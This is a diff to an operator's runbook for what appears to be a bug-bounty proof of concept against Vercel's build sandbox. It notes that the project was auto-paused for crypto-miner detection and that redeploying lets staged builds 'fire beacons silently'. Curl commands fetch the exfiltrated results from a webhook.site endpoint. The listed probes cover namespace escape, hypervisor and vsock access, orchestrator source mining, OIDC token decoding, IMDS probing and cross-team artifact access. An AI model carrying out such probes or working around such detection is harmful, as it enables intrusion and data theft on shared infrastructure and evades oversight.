@@ -38,9 +38,10 @@ base64 keys, hex patterns that matched miner signatures).
 https://vercel.com/hackerone-sandbox-s-projects/vercel-agent-poc/deployments
 Project was auto-paused due to crypto miner detection in v34 build logs.
 Click "Enable" or "Redeploy" to allow builds to run again.
-v39 (36bb0bf) is staged and WILL fire beacons silently once builds resume.
+v42 (ab5dd14+) is staged (includes v39/v40/v41/v42 sections) — WILL fire beacons silently once builds resume.
+Note: All v39-v42 sections run in ONE build since project has been paused. One build = ALL data.
 
-### 2. CHECK FOR v40 BEACON (after re-enabling)
+### 2. CHECK FOR v42 BEACON (after re-enabling)
 ```bash
 curl -s "https://webhook.site/token/77ec85f4-79b9-4fb0-a0f6-4e44566f2eac/requests?sorting=newest&per_page=5" | python3 -c "
 import sys, json
@@ -54,9 +55,9 @@ for x in d['data'][:5]:
     except: pass
 "
 ```
-Expected: 52-54/100 total with VERCEL-AGENT-PROBE-7F3A2C-v40-early + v40 markers.
+Expected: 52-54/100 total with VERCEL-AGENT-PROBE-7F3A2C-v42-early + v42 markers.
 
-### 3. EXTRACT v40 KEY RESULTS
+### 3. EXTRACT v42 KEY RESULTS (includes all v39-v42 sections)
 ```bash
 curl -s "https://webhook.site/token/77ec85f4-79b9-4fb0-a0f6-4e44566f2eac/requests?sorting=newest&per_page=5" | python3 -c "
 import sys, json
@@ -64,17 +65,24 @@ d = json.load(sys.stdin)
 for x in d['data'][:5]:
     try:
         b = json.loads(x['content'])
-        if 'v40' not in b.get('marker','') or 'early' in b.get('marker',''): continue
-        print('=== v40 FULL BEACON ===')
+        if 'v42' not in b.get('marker','') or 'early' in b.get('marker',''): continue
+        print('=== v42 FULL BEACON ===')
+        # v39 — namespace escape
         print('nscanAllPids:', str(b.get('nscanAllPids',{}))[:2000])
+        print('abstractSockets:', str(b.get('abstractSockets',{}))[:500])
+        # v40 — hypervisor access
         print('vsockProbe:', str(b.get('vsockProbe',{}))[:1000])
         print('devMemProbe:', str(b.get('devMemProbe',{}))[:1000])
         print('arpDiscovery:', str(b.get('arpDiscovery',{}))[:2000])
-        print('bpfCapProbe:', str(b.get('bpfCapProbe',{}))[:500])
-        print('rawSocketProbe:', str(b.get('rawSocketProbe',{}))[:1000])
-        print('cellSockDirectAttempt:', str(b.get('cellSockDirectAttempt',{}))[:500])
-        print('orchestratorCellProtocol:', str(b.get('orchestratorCellProtocol',{}))[:1000])
-        print('abstractSockets:', str(b.get('abstractSockets',{}))[:500])
+        print('rawSocketProbe:', str(b.get('rawSocketProbe',{}))[:800])
+        # v41 — source mining
+        print('orchestratorSourceMine:', str(b.get('orchestratorSourceMine',{}))[:3000])
+        print('oidcTokenFullDecode:', str(b.get('oidcTokenFullDecode',{}))[:500])
+        # v42 — cross-service attacks
+        print('imdsV6Probe:', str(b.get('imdsV6Probe',{}))[:500])
+        print('artifactsCrossTeamProbe:', str(b.get('artifactsCrossTeamProbe',{}))[:800])
+        print('containerdNetworkProbe:', str(b.get('containerdNetworkProbe',{}))[:500])
+        print('sysfsHardware:', str(b.get('sysfsHardware',{}))[:600])
     except: pass
 "
 ```
